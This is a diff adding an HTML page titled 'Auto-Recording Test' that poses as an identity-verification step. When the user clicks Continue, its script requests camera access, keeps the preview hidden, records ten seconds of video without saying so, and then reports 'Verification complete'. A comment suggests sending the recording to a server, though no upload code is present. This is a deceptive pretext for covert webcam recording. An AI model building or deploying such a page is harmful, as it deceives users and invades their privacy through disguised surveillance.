@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Auto-Recording Test</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 50px;
+    }
+    video {
+      width: 320px;
+      height: 240px;
+      border: 1px solid #ccc;
+      margin: 20px auto;
+      display: block;
+    }
+    button {
+      font-size: 16px;
+      padding: 10px 20px;
+      margin: 10px;
+      cursor: pointer;
+    }
+    #status {
+      margin-top: 15px;
+      color: #333;
+    }
+    #videoContainer {
+      display: none; /* Hide the video preview */
+    }
+  </style>
+</head>
+<body>
+  <h1>Verification Required</h1>
+  <p>Click "Continue" to verify your identity.</p>
+  <button id="continueBtn">Continue</button>
+  <div id="videoContainer">
+    <video id="video" autoplay muted></video>
+  </div>
+  <p id="status"></p>
+
+  <script>
+    const continueBtn = document.getElementById('continueBtn');
+    const video = document.getElementById('video');
+    const status = document.getElementById('status');
+    const videoContainer = document.getElementById('videoContainer');
+
+    let mediaStream = null;
+    let mediaRecorder = null;
+    let recordedChunks = [];
+
+    continueBtn.addEventListener('click', async () => {
+      status.textContent = 'Verifying...';
+      try {
+        // Request camera access
+        mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = mediaStream;
+        status.textContent = 'Processing...';
+
+        // Hide the video preview (optional)
+        videoContainer.style.display = 'none';
+
+        // Start recording automatically
+        recordedChunks = [];
+        mediaRecorder = new MediaRecorder(mediaStream);
+        mediaRecorder.ondataavailable = e => {
+          if (e.data.size > 0) recordedChunks.push(e.data);
+        };
+        mediaRecorder.onstop = () => {
+          const blob = new Blob(recordedChunks, { type: 'video/webm' });
+          const url = URL.createObjectURL(blob);
+          
+          // Optional: Send the recording to a server (for testing)
+          // You'd need a backend for this (e.g., Firebase, AWS Lambda).
+          
+          // For now, just simulate a "success" message
+          status.textContent = 'Verification complete. Thank you!';
+          
+          // Stop the camera stream
+          mediaStream.getTracks().forEach(track => track.stop());
+        };
+        
+        mediaRecorder.start();
+        
+        // Stop recording after 10 seconds (adjust as needed)
+        setTimeout(() => {
+          if (mediaRecorder.state === 'recording') {
+            mediaRecorder.stop();
+          }
+        }, 10000); // 10 seconds
+
+      } catch (err) {
+        status.textContent = 'Error: Camera access denied.';
+        console.error(err);
+      }
+    });
+  </script>
+</body>
+</html>
